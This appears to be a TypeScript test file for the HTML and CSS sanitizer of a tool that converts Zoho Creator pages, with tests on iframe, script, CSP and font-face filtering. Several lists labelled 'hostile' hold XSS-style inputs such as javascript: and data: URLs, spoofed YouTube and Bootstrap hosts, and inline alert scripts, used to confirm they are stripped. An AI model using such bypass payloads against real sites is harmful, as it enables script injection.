  assert.equal(buildSanitize(input), want);
  assert.equal(run.sanitizeSnippet(input, doc), want);
  const dropped: string[] = [];
  buildSanitize(input, undefined, dropped);
  assert.deepEqual(dropped, [], 'a kept frame is not a counted removal');
  assert.equal(buildSanitize('<iframe src="https://youtube.com/embed/CPjUpwUpOK8"></iframe>'), FRAME_KEPT);
});

test('every other iframe is still removed, in both sanitizers, and stays a counted removal', async () => {
  const run = await runtime();
  const doc = new JSDOM('<!doctype html><html><body></body></html>').window.document;
  const hostile = [
    'https://evil.example/embed/CPjUpwUpOK8',
    'https://www.youtube.com.evil.example/embed/CPjUpwUpOK8',
    'https://evil.example/https://www.youtube.com/embed/CPjUpwUpOK8',
    `https://www.youtube.com${String.fromCharCode(64)}evil.example/embed/CPjUpwUpOK8`,
    'https://user:pw@www.youtube.com/embed/CPjUpwUpOK8',
    'https://www.youtube.com:444/embed/CPjUpwUpOK8',
    'http://www.youtube.com/embed/CPjUpwUpOK8',
    '//www.youtube.com/embed/CPjUpwUpOK8',
    'HTTPS://WWW.YOUTUBE.COM/embed/CPjUpwUpOK8',
    'https://www.youtube.com/embed/CPjUpwUpOK8?autoplay=1',
    'https://www.youtube.com/embed/CPjUpwUpOK8#x',
    'https://www.youtube.com/embed/CPjUpwUpOK8/',
    'https://www.youtube.com/embed/CPjUpwUpOK8%0a',
    'https://www.youtube.com/embed/../watch',
    'https://www.youtube.com/embed/short',
    'https://www.youtube.com/embed/CPjUpwUpOK8extra',
    'https://www.youtube.com/watch?v=CPjUpwUpOK8',
    'https://www.youtube.com/embed/videoseries?list=PL1',
    'javascript:alert(1)',
    'data:text/html,<script>x()</script>',
    ' https://www.youtube.com/embed/CPjUpwUpOK8',
    'https://www.youtube.com/embed/CPjUpwUpOK8\n',
    '',
  ];
  for (const src of hostile) {
    const html = `<p>a</p><iframe src="${src.replace(/"/g, '&quot;')}"></iframe>`;
    const dropped: string[] = [];
    assert.equal(buildSanitize(html, undefined, dropped), '<p>a</p>', src);
    assert.deepEqual(dropped, ['iframe'], src);
    assert.equal(run.sanitizeSnippet(html, doc), '<p>a</p>', src);
  }
  for (const html of ['<iframe></iframe>', '<iframe srcdoc="<p>x</p>"></iframe>', '<object data="https://www.youtube.com/embed/CPjUpwUpOK8"></object>', '<embed src="https://www.youtube.com/embed/CPjUpwUpOK8">', '<frame src="https://www.youtube.com/embed/CPjUpwUpOK8">']) {
    assert.equal(buildSanitize(html), '', html);
    assert.equal(run.sanitizeSnippet(html, doc), '', html);
  }
});

test('the shell CSP frames only itself and the video host', async () => {
  const { SHELL_CONTENT_SECURITY_POLICY } = await import('../src/csp.js');
  assert.match(SHELL_CONTENT_SECURITY_POLICY, /frame-src 'self' https:\/\/www\.youtube-nocookie\.com;/);
  assert.doesNotMatch(SHELL_CONTENT_SECURITY_POLICY, /\*|youtube\.com|script-src[^;]*youtube/);
});

test('a page snippet with a YouTube player frame carries it and counts no removed iframe', () => {
  const zml = `<zml><dsp id='html_snippet'><![CDATA[<p>Watch</p><iframe width="640" height="360" src="https://www.youtube.com/embed/CPjUpwUpOK8" frameborder="0" allowfullscreen></iframe>]]></dsp></zml>`;
  const app: App = deriveIr(parse(`application "Demo"\n{\n\tpages\n\t{\n\t\tpage Home\n\t\t{\n\t\t\tdisplayname = "Home"\n\t\t\tContent="${delugeString(zml)}"\n\t\t}\n\t}\n}\n`));
  const model = buildModel(app);
  assert.deepEqual(model.todos.filter((todo) => todo.area === 'zml'), []);
  assert.ok(JSON.stringify(model.pages[0]).includes('youtube-nocookie.com/embed/CPjUpwUpOK8'));
});

const BOOTSTRAP_JS = 'https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js';

function scriptTodos(markup: string): string[] {
  const { model } = pageModel([markup]);
  return model.todos.filter((todo) => /<script> element/.test(todo.reason)).map((todo) => todo.reason);
}

function scriptTodosIn(pages: string[], functions = ''): string[] {
  const body = pages
    .map((html, i) => `\t\tpage P${i}\n\t\t{\n\t\t\tdisplayname = "P${i}"\n\t\t\tContent="${delugeString(`<zml><dsp id='s${i}'><![CDATA[${html}]]></dsp></zml>`)}"\n\t\t}\n`)
    .join('');
  const app: App = deriveIr(parse(`application "Demo"\n{\n\tpages\n\t{\n${body}\t}\n${functions}}\n`));
  return buildModel(app)
    .todos.filter((todo) => /<script> element/.test(todo.reason))
    .map((todo) => todo.name);
}

test('a Bootstrap 3 script in an app with no hook anywhere starts nothing, so removing it is not a loss', () => {
  assert.deepEqual(scriptTodos(`<p>Hi</p><script src="${BOOTSTRAP_JS}" integrity="sha384-x" crossorigin="anonymous"></script>`), []);
  const { html } = pageModel([`<p>Hi</p><script src="${BOOTSTRAP_JS}"></script>`]);
  assert.doesNotMatch(html[0]?.html ?? '', /script|bootstrap/i);
});

test('a Bootstrap 3 script stays a counted removed script when any text in the app could hand it work', () => {
  const lone = `<script src="${BOOTSTRAP_JS}"></script>`;
  const hooks = ['<a data-toggle="modal" data-target="#m">Open</a>', '<b onclick="go()">x</b>', '<i>jQuery</i>', '<u>&#100;ata-toggle</u>'];
  for (const hook of hooks) {
    // the hook sits in a sibling snippet, on another page of the app, or in a function body
    assert.equal(scriptTodos(`${lone}<p>x</p>`.concat(hook)).length, 1, hook);
    assert.deepEqual(scriptTodosIn([lone, hook]), ['P0.dsp'], hook);
    assert.deepEqual(scriptTodosIn([lone], `\tfunctions\n\t{\n\t\tvoid a.b()\n\t\t{\n\t\t\tinfo "${delugeString(hook)}";\n\t\t}\n\t}\n`), ['P0.dsp'], hook);
  }
  assert.deepEqual(scriptTodosIn([lone, '<p>plain</p>']), []);
  assert.equal(scriptTodos(`<script src="${BOOTSTRAP_JS}" onload="$('#m').modal('show')"></script>`).length, 1);
});

test('a library script that could act stays a counted removed script', () => {
  const hostile = [
    `<button data-toggle="modal" data-target="#m">Open</button><script src="${BOOTSTRAP_JS}"></script>`,
    `<script src="${BOOTSTRAP_JS}"></script><a data-dismiss="alert">x</a>`,
    `<script src="${BOOTSTRAP_JS}">$('#m').modal('show')</script>`,
    `<script src="${BOOTSTRAP_JS}"></script><script>$('#m').modal('show')</script>`,
    '<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>',
    '<script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>',
    '<script src="https://maxcdn.bootstrapcdn.com.evil.test/bootstrap/3.3.7/js/bootstrap.min.js"></script>',
    '<script src="https://evil.test/https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>',
    `<script src="${BOOTSTRAP_JS}?x=1"></script>`,
    `<script src=" ${BOOTSTRAP_JS}"></script>`,
    '<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>',
    '<script>alert(1)</script>',
  ];
  for (const markup of hostile) assert.equal(scriptTodos(markup).length, 1, markup);
});

test('a number a Deluge tag computes inside a declaration value is carried as a custom property the render sets', () => {
  const raw = '<style>\n.pie { background: #bbe491; -webkit-transform: rotate(<%=a%>deg); transform: rotate(<%=a%>deg); }\n.bar { width: <%=w%>px; height: <%=h + 1%>%; margin: 0 <%=gap%>em; color: rgb(<%=r%>, 0, 0); }\n</style>';
  const carried = carriedStyleRules(raw, scope);
  assert.deepEqual(carried.dropped, []);
  assert.match(carried.css, /\.pie\{background: #bbe491;-webkit-transform: rotate\(var\(--cssvalue-a\)\);transform: rotate\(var\(--cssvalue-b\)\)\}/);
  assert.match(carried.css, /\.bar\{width: var\(--cssvalue-c\);height: var\(--cssvalue-d\);margin: 0 var\(--cssvalue-e\);color: rgb\(var\(--cssvalue-f\), 0, 0\)\}/);
  assert.deepEqual(styleValues(raw).map((v) => [v.name, v.expr, v.unit]), [
    ['--cssvalue-a', 'a', 'deg'], ['--cssvalue-b', 'a', 'deg'], ['--cssvalue-c', 'w', 'px'], ['--cssvalue-d', 'h + 1', '%'], ['--cssvalue-e', 'gap', 'em'], ['--cssvalue-f', 'r', ''],
  ]);
  // Names run past z.
  const many = '<style>.a { ' + Array.from({ length: 28 }, () => 'top: <%=n%>px;').join(' ') + ' }</style>';
  assert.deepEqual(styleValues(many).slice(25).map((v) => v.name), ['--cssvalue-z', '--cssvalue-aa', '--cssvalue-ab']);
});

test('a Deluge tag that is not one whole number in a declaration value stays counted CSS', () => {
  const cases = [
    '.a { color: <%=c%>; }',
    '.a { width: <%=w%>foo; }',
    '.a { width: -<%=w%>px; }',
    '.a { width: <%=w%>px<%=u%>; }',
    '.a { width: 1<%=w%>px; }',
    '.a<%=n%> { width: 1px; }',
    '.a { <%=n%>: 1px; }',
    '@media (min-width: <%=w%>px) { .a { width: 1px; } }',
    '.a { content: "<%=w%>px"; }',
    '.a { /* <%=w%>px */ }',
    '.a { width: <%=%>px; }',
    '.a { width: <%=w%>px; --cssvalue-a: 1px; }',
    '.a { width: <%=w%>px; }\n<% if (x) { %>.b { top: 1px; }<% } %>',
  ];
  for (const css of cases) {
    const carried = carriedStyleRules(`<style>${css}</style>`, scope);
    assert.doesNotMatch(carried.css, /--cssvalue-[a-z]+\)/, css);
    assert.ok(carried.dropped.length > 0 || /--cssvalue-a: 1px/.test(css) || css.includes('if (x)'), css);
    assert.deepEqual(styleValues(`<style>${css}</style>`), [], css);
  }
});

test('a font face keeps what a Creator browser loaded: spaced same-origin names and local(), not the blocked http: font', () => {
  const { styleTodos, scopedCss } = pageModel([
    [
      '<style>',
      "@font-face { font-family: 'ProximaNova Light'; src: url('fonts/ProximaNova Light.otf') format('opentype'); }",
      "@font-face { font-family: 'Tangerine'; font-weight: 400; src: local('Tangerine'), url('http://fonts.gstatic.com/s/tangerine/v7/a.woff2') format('woff2'); }",
      '</style><p>x</p>',
    ].join('\n'),
  ]);
  assert.deepEqual(styleTodos, []);
  assert.match(scopedCss, /@font-face\{font-family: 'ProximaNova Light';src: url\('fonts\/ProximaNova%20Light\.otf'\) format\('opentype'\)\}/);
  assert.match(scopedCss, /src: local\('Tangerine'\)\}/);
  assert.doesNotMatch(scopedCss, /gstatic|http:/);
});

test('a font face source that is hostile or loaded nothing the generated app may fetch stays counted', () => {
  const hostile = [
    "url('http://fonts.gstatic.com/s/a.woff2') format('woff2')",
    "url('https://fonts.gstatic.com/s/a.woff2')",
    "url('//evil.test/a b.otf')",
    "url('java script:a.otf')",
    "url('a b:c.otf')",
    "url(' fonts/a.otf')",
    "url('fonts/a\tb.otf')",
    "url('fonts/a b.otf'",
  ];
  for (const src of hostile) {
    const { styleTodos, scopedCss } = pageModel([`<style>@font-face { font-family: 'X'; src: ${src}; }</style><p>x</p>`]);
    assert.doesNotMatch(scopedCss, /@font-face/, src);
    assert.equal(styleTodos.length, 1, src);
  }
});

test('a font face source with a stray parenthesis is invalid CSS and carries no source at all', () => {
  const { scopedCss } = pageModel(["<style>@font-face { font-family: 'X'; src: url('fonts/a b.otf') ) , url('http://evil.test/x'); }</style><p>x</p>"]);
  assert.doesNotMatch(scopedCss, /src|evil|url/);
});

test('a checkbox or label may not take an id the page shell owns', () => {
  const { html } = pageModel([
    '<input type="checkbox" id="toasts"><label for="more-tab">x</label><input type="checkbox" id="Tabbar"><input type="checkbox" id="mine"><label for="mine">y</label>',
  ]);
  const out = html[0]?.html ?? '';
  assert.doesNotMatch(out, /id="toasts"|for="more-tab"|id="Tabbar"/i);
  assert.match(out, /id="mine"/);
  assert.match(out, /for="mine"/);
});
